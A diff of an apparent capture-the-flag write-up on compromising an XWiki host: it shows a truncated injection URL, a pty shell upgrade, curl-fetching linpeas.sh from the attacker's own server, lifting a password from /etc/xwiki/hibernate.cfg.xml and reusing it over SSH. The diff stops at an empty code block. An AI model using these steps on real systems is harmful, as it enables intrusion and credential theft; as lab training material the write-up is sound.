@@ -67,7 +67,6 @@ http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7
 ![[Pasted image 20250810030501.png]]
 
 This shell is not that beautiful so I just do `python3 -c 'import pty; pty.spawn("/bin/bash")'` so have a better shell. Yaaye!
-## Lateral Privilege Escalation
 
 I start by installing `linpeas.sh` on the remote host and run it. I installed `linpeas.sh` by exposing a `http.server` locally and then simply `curl -LO 10.10.16.16:8000/linpeas.sh`.
 While this outputs many things, I was not able to find anything directly here. Sad.
@@ -75,7 +74,10 @@ While this outputs many things, I was not able to find anything directly here. S
 Instead I noticed that within `/home` there is folder for username `oliver`. So, I tried finding a password. I had to do manual lookups and found a password for `xwiki` that looks interesting in file `/etc/xwiki/hibernate.cfg.xml`.
 ![[Pasted image 20250811000901.png]]
 
-So, I try to login to `oliver` via `ssh` and success!
+So, I try to login to `oliver` via `ssh` and success! Now we can get the user flag.
+## Linear Privilege Escalation
 
+User **oliver** does not have any sudo perimissions. So I explore the system a little bit. Interesting findings for the ports u see.
+``
 
 
